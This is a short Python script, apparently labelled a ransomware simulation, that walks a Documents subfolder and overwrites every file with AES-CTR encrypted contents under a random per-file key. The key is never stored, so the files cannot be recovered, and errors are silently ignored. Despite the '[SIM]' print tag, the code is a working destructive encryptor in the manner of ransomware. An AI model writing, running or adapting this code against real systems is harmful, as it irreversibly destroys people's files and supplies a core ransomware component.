from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

def encrypt_file(path):
    key = get_random_bytes(32)
    cipher = AES.new(key, AES.MODE_CTR)

    try:
        with open(path, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(path, "wb") as f:
            f.write(encrypted)
        print("[SIM] Encrypted", path)
    except:
        pass

def run(folder):
    for r, _, files in os.walk(folder):
        for file in files:
            encrypt_file(os.path.join(r, file))

if __name__ == "__main__":
    run("C:/Users/YourName/Documents/test_folder")
